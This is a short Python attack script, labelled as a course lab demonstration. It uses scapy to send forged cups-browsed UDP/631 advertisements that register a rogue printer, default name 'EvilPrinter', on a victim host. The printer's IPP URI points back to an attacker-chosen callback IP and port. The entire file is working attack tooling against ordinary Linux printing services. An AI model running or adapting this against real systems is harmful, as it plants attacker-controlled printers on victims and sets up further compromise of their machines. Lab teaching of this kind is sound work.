#!/usr/bin/env python3
"""cups_attack.py - advertise a rogue printer to cups-browsed (UDP/631).
   DAT505 - discovery demonstration only. Lab use on authorized hosts."""
import argparse, logging
from scapy.all import IP, UDP, Raw, send, wrpcap

def build_browse_payload(printer_uri, location, info):
    p_type = 2
    state = 3
    payload_str = f'{p_type} {state} {printer_uri} "{location}" "{info}"'
    return payload_str.encode('utf-8')

def build_packet(target_ip, printer_uri, location, info):
    payload = build_browse_payload(printer_uri, location, info)
    packet = IP(dst=target_ip) / UDP(sport=631, dport=631) / Raw(load=payload)
    return packet

def main():
    ap = argparse.ArgumentParser(description="CUPS rogue-printer advertiser (lab).")
    ap.add_argument("--target", required=True, help="victim IP (e.g. 172.18.0.2)")
    ap.add_argument("--attacker", required=True, help="callback IP (e.g. 172.18.0.1)")
    ap.add_argument("--port", type=int, default=8632, help="callback printer port")
    ap.add_argument("--count", type=int, default=1, help="how many to send")
    ap.add_argument("--pcap", help="save sent packets to this pcap")
    ap.add_argument("--printer-name", default="EvilPrinter")
    ap.add_argument("--location", default="lab")
    ap.add_argument("--info", default="rogue printer")
    args = ap.parse_args()

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s")

    uri = f"ipp://{args.attacker}:{args.port}/printers/{args.printer_name}"
    pkt = build_packet(args.target, uri, args.location, args.info)

    sent = []
    for i in range(args.count):
        send(pkt, verbose=False)
        logging.info("sent advertisement %d -> %s (uri=%s)", i + 1, args.target, uri)
        sent.append(pkt)

    if args.pcap:
        wrpcap(args.pcap, sent)
        logging.info("saved %d packets to %s", len(sent), args.pcap)

if __name__ == "__main__":
    main()
